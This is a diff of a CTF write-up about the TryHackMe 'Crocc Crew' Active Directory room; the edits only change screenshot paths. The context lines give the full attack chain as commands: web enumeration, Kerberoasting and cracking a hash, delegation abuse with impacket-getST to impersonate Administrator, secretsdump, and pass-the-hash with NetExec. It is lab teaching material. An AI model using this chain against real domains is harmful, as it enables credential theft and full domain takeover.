@@ -58,7 +58,7 @@ The combination of `Kerberos`,`LDAP`,`SMB`,`RPC`,`RDP`,`WinRM` strongly suggeste
 
 At the same time, port 80 gave me a web application, making HTTP one of the first attack surfaces worth investigating.
 
-![Nmap](/assets/images/writeups/crocc_crew/1.png)
+![Nmap](/assets/images/writeups/thm/crocc_crew/1.png)
 
 ---
 
@@ -66,21 +66,21 @@ At the same time, port 80 gave me a web application, making HTTP one of the firs
 
 Navigating to port 80 revealed the Crocc Crew web application.
 
-![greetings](/assets/images/writeups/crocc_crew/2.png)
+![greetings](/assets/images/writeups/thm/crocc_crew/2.png)
 
 Because the web server was accessible, I started content discovery.
 
 ```bash
 gobuster dir -u http://10.49.135.61 -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 50  
 ```
-![gobuster](/assets/images/writeups/crocc_crew/3.png)
+![gobuster](/assets/images/writeups/thm/crocc_crew/3.png)
 
 One interesting discovery was `/robots.txt`. I checked it because robots.txt sometimes exposes directories or files that the site owner does not want search engines to index.
 
 The file revealed additional endpoints. Two particularly interesting discoveries were `/db-config.bak`,
 `/backdoor.php`
 
-![robots](/assets/images/writeups/crocc_crew/4.png)
+![robots](/assets/images/writeups/thm/crocc_crew/4.png)
 
 ---
 
@@ -91,7 +91,7 @@ This was an important discovery because credentials found in web application fil
 
 Instead of immediately assuming that the credentials were only for the web application, I kept them for later authentication testing.
 
-![config](/assets/images/writeups/crocc_crew/5.png)
+![config](/assets/images/writeups/thm/crocc_crew/5.png)
 
 ---
 
@@ -102,13 +102,13 @@ However, commands such as `whoami`, `id`, `ls`, `pwd` did not behave like normal
 
 The interface was actually based on `jQuery Terminal`. 
 
-![backdoor](/assets/images/writeups/crocc_crew/6.png)
+![backdoor](/assets/images/writeups/thm/crocc_crew/6.png)
 
 Further investigation showed that the application implemented its own limited command logic. For example, the application accepted something similar to `hello +  <argument>` and returned the supplied argument.
 
-![jquery_terminal](/assets/images/writeups/crocc_crew/7.png)
+![jquery_terminal](/assets/images/writeups/thm/crocc_crew/7.png)
 
-![jquery_terminal](/assets/images/writeups/crocc_crew/8.png)
+![jquery_terminal](/assets/images/writeups/thm/crocc_crew/8.png)
 
 This was an important lesson for me: `A page that looks like a shell is not necessarily a real shell.`
 
@@ -123,7 +123,7 @@ Since the target appeared to belong to an Active Directory domain, I also starte
 ```bash
 impacket-GetNPUsers 'COOCTUS.CORP/' -dc-ip 10.49.135.61 -usersfile users.txt -no-pass
 ```
-![users](/assets/images/writeups/crocc_crew/9.png)
+![users](/assets/images/writeups/thm/crocc_crew/9.png)
 
 The important thing here was not only the output itself, but also the discovery that `WinRM` was available.
 
@@ -136,7 +136,7 @@ When the initial enumeration did not immediately provide a path forward, I perfo
 ```bash
 nmap -p- --min-rate 3000 -T4 10.49.135.61 -oN allports.txt 
 ```
-![winrm](/assets/images/writeups/crocc_crew/9.1.png)
+![winrm](/assets/images/writeups/thm/crocc_crew/9.1.png)
 
 This reinforced an important CTF lesson: `When the current attack path stops producing useful information, go back to enumeration rather than forcing the current technique.`
 
@@ -151,7 +151,7 @@ One of the services that I initially overlooked was RPC. I attempted a null/user
 ```bash
 rpcclient -U% <target-ip>
 ```
-![rpcclient](/assets/images/writeups/crocc_crew/10.png)
+![rpcclient](/assets/images/writeups/thm/crocc_crew/10.png)
 
 Most RPC commands were restricted, but `enumprivs` returned useful information. The privileges included `SeEnableDelegationPrivilege`,`SeDelegateSessionUserImpersonatePrivilege`. These immediately caught my attention.
 
@@ -190,17 +190,17 @@ I also investigated RDP.
 ```bash
 rdesktop -f -u "" <target-ip>
 ```
-![rdesktop](/assets/images/writeups/crocc_crew/11.png)
+![rdesktop](/assets/images/writeups/thm/crocc_crew/11.png)
 
 The RDP session exposed information associated with the visitor account. I also tested the credentials obtained earlier from the web application's configuration file ie `db.config-bak`
 
 Trying to remotely authenticate as the guest/visitor user produced additional information.
 
-![rdp1](/assets/images/writeups/crocc_crew/rdp1.png)
+![rdp1](/assets/images/writeups/thm/crocc_crew/rdp1.png)
 
 Although I could not simply obtain a normal interactive remote session, the information displayed on the screen was valuable.
 
-![rdp2](/assets/images/writeups/crocc_crew/rdp2.png)
+![rdp2](/assets/images/writeups/thm/crocc_crew/rdp2.png)
 
 I noticed what appeared to be a username on the sticky note. This username matched something useful from my earlier enumeration.
 
@@ -213,7 +213,7 @@ I tested the discovered credentials against SMB using NetExec.
 ```bash
 nxc smb 10.49.162.64 -u "<username>" -p "<password>"
 ```
-![nxc](/assets/images/writeups/crocc_crew/12.png)
+![nxc](/assets/images/writeups/thm/crocc_crew/12.png)
 
 This finally confirmed that I had valid credentials. This was a major turning point. Instead of continuing with unauthenticated enumeration, I could now perform authenticated enumeration.
 
@@ -226,14 +226,14 @@ With valid credentials, I enumerated SMB shares.
 ```bash
 smbmap -u <username> -p "<password>" -H <target-ip> -r Home
 ```
-![smbmap](/assets/images/writeups/crocc_crew/13.png)
+![smbmap](/assets/images/writeups/thm/crocc_crew/13.png)
 
 I also connected directly to the Home share.
 
 ```bash
 smbclient //<target-ip>/Home -U visitor 
 ```
-![smbclient](/assets/images/writeups/crocc_crew/14.png)
+![smbclient](/assets/images/writeups/thm/crocc_crew/14.png)
 
 This gave me access to the first flag. More importantly, authenticated SMB access allowed me to continue enumerating the environment from a much stronger position.
 
@@ -246,9 +246,9 @@ I used enum4linux-ng with the credentials I had obtained.
 ```bash
 enum4linux-ng -u <username> -p '<password>' <target-ip>
 ```
-![enum4linux](/assets/images/writeups/crocc_crew/15.png)
-![enum4linux](/assets/images/writeups/crocc_crew/15.1.png)
-![enum4linux](/assets/images/writeups/crocc_crew/15.2.png)
+![enum4linux](/assets/images/writeups/thm/crocc_crew/15.png)
+![enum4linux](/assets/images/writeups/thm/crocc_crew/15.1.png)
+![enum4linux](/assets/images/writeups/thm/crocc_crew/15.2.png)
 
 This provided additional information about the Windows domain and users.
 
@@ -263,7 +263,7 @@ With valid domain credentials, I enumerated Service Principal Names using Impack
 ```bash
 impacket-GetUserSPNs COOCTUS.CORP/<username>:<password> -request -dc-ip <target-ip>
 ```
-![impacket](/assets/images/writeups/crocc_crew/16.png)
+![impacket](/assets/images/writeups/thm/crocc_crew/16.png)
 
 This identified a useful Kerberos service account and allowed me to request its service ticket. The resulting hash could then be attacked offline.
 
@@ -274,7 +274,7 @@ I used John the Ripper against the extracted hash:
 ```bash
 john password_reset_hash.txt --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/alleged-gmail-passwords.txt --fork=4
 ```
-![jtr](/assets/images/writeups/crocc_crew/17.png)
+![jtr](/assets/images/writeups/thm/crocc_crew/17.png)
 
 The password was successfully recovered. At this point, I had another set of valid credentials that could be used for deeper Active Directory enumeration.
 
@@ -287,8 +287,8 @@ I next used ldapdomaindump to obtain a broader picture of the domain.
 ```bash
 ldapdomaindump 10.49.142.181 -u 'COOCTUS.CORP\<username>' -p '<password>'
 ```
-![ldapdomaindump](/assets/images/writeups/crocc_crew/18.png)
-![ldapdomaindump](/assets/images/writeups/crocc_crew/18_1.png)
+![ldapdomaindump](/assets/images/writeups/thm/crocc_crew/18.png)
+![ldapdomaindump](/assets/images/writeups/thm/crocc_crew/18_1.png)
 
 LDAP was particularly useful because it exposed Active Directory information that was not obvious from the web application.
 
@@ -303,7 +303,7 @@ I used Pywerview to obtain additional information about the user and domain.
 ```bash
 python3 ~/Desktop/Tools/pywerview/pywerview.py get-netuser -u <username> -p "<password>" -t dc.COOCTUS.CORP -d COOCTUS.CORP
 ```
-![pywerview](/assets/images/writeups/crocc_crew/19.png)
+![pywerview](/assets/images/writeups/thm/crocc_crew/19.png)
 
 This helped confirm the user's domain context and provided additional information relevant to the delegation attack path.
 
@@ -320,7 +320,7 @@ The critical step was abusing the configured delegation relationship. I used Imp
 ```bash
 impacket-getST -spn oakley/DC.COOCTUS.CORP -impersonate administrator "COOCTUS.CORP/<username>:<password>" -dc-ip 10.49.186.133
 ```
-![getST](/assets/images/writeups/crocc_crew/20.png)
+![getST](/assets/images/writeups/thm/crocc_crew/20.png)
 
 The important concept is:
 
@@ -349,7 +349,7 @@ The `getST` operation generated a `Kerberos credential cache (ccache) file`. I e
 ```bash
 export KRB5CCNAME="$PWD/administrator@oakley_DC.COOCTUS.CORP@COOCTUS.CORP.ccache"
 ```
-![getST](/assets/images/writeups/crocc_crew/20_1.png)
+![getST](/assets/images/writeups/thm/crocc_crew/20_1.png)
 
 This tells Kerberos-aware tools to use the generated ticket cache.
 
@@ -362,7 +362,7 @@ With the Administrator service ticket available, I used Impacket's secretsdump.
 ```bash
 impacket-secretsdump -k -no-pass DC.COOCTUS.CORP
 ```
-![secretsdump](/assets/images/writeups/crocc_crew/21.png)
+![secretsdump](/assets/images/writeups/thm/crocc_crew/21.png)
 
 This successfully returned credential material, including the Administrator NTLM hash. At this point, I had effectively obtained a credential that could be used for privileged access.
 
@@ -375,7 +375,7 @@ I validated the Administrator hash with `NetExec`.
 ```bash
 nxc smb 10.49.186.133 -u Administrator -H add41<REDACTED>022d -x whoaminxc smb 10.49.186.133 -u Administrator -H add41<REDACTED>022d -x whoami
 ```
-![admin](/assets/images/writeups/crocc_crew/22.png)
+![admin](/assets/images/writeups/thm/crocc_crew/22.png)
 
 The command execution confirmed Administrator-level access. So i could then obtain an interactive `WinRM shell`.
 
@@ -392,15 +392,15 @@ OR
 nxc smb 10.48.180.235 -u Administrator -H 'add41<REDACTED>022d' --exec-method wmiexec -x cmd.exe
 ```
 
-![user_flag](/assets/images/writeups/crocc_crew/23.png)
+![user_flag](/assets/images/writeups/thm/crocc_crew/23.png)
 
 This gave me full administrative access to the machine and allowed me to retrieve the final flag.
 
 ---
 
-🖼️ **All process 1 screenshot** ![all_process_1_screenshort](/assets/images/writeups/crocc_crew/all_process_1.png)
+🖼️ **All process 1 screenshot** ![all_process_1_screenshort](/assets/images/writeups/thm/crocc_crew/all_process_1.png)
 
-🖼️ **All process 2 screenshot** ![all_process_2_screenshort](/assets/images/writeups/crocc_crew/all_process_2.png)
+🖼️ **All process 2 screenshot** ![all_process_2_screenshort](/assets/images/writeups/thm/crocc_crew/all_process_2.png)
 
 ## My overall attack path was:
 
